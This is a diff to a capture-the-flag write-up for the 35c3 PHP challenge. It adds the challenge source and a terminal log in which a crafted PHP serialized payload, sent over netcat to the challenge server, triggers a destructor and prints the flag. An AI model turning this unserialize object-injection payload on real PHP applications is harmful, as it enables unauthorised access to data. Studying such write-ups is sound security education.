@@ -2,6 +2,20 @@
 Solution for 35c3 php challenge
 
 The challenge consists of a single php file. 
+```
+<?php
+$line = trim(fgets(STDIN));
+$flag = file_get_contents('/flag');
+class B {
+  function __destruct() {
+    global $flag;
+    echo $flag;
+  }
+}
+$a = @unserialize($line);
+throw new Exception('Well that was unexpected…');
+echo $a;
+```
 
 1. It reads the user input from STDIN.
 2. It reads the content of the flag file into $flag variable.
@@ -10,7 +24,7 @@ The challenge consists of a single php file.
 5. It throws an exception.
 
 
-PHP serialization library is the source of many vulnerabilities. A common logical bug involves actions done from magic methods such as 
+PHP serialization library is the source of many vulnerabilities. Common logical bugs involve actions done from magic methods such as 
 \__destruct.
 
 We can serialize an instance of 'B' class, which means that its destructor will get called at some point and echo the content of the flag.
@@ -23,9 +37,9 @@ To overcome this, I wanted to make sure the destruct method gets called prior to
 
 a:2:{i:1;O:1:"B":0:{};i:2;o:1:"C":0:{};}
 
-This will unserialize an array, consisting of a 'B' object as its first item. For the second item, we will try to unserialize an object of class 'C' which isn't declared. That will throw an exception (which is silently avoided because of the '@' prior to the unserialize call). Still, the unserialize call already instantiated an instance of 'B' class thus it have to call its destruct method and echo the content of $flag.
+This will unserialize an array, consisting of a 'B' object as its first item. For the second item, we will try to unserialize an object of class 'C' which isn't declared. That will throw an exception. As that call to unserialize has the @ mark before it, php will silence any php error the function raises. As the unserialize call already instantiated an instance of 'B' class, it has to call its destruct method and echo the content of $flag.
 
-
+```
 gal@ubuntu:/var/www/html$ nc 35.242.207.13 1
 a:2:{i:1;O:1:"B":0:{};i:2;o:1:"C":0:{};}
 35C3_php_is_fun_php_is_fun
@@ -34,3 +48,4 @@ Stack trace:
 #0 {main}
   thrown in /home/user/php.php on line 16
 gal@ubuntu:/var/www/html$
+```
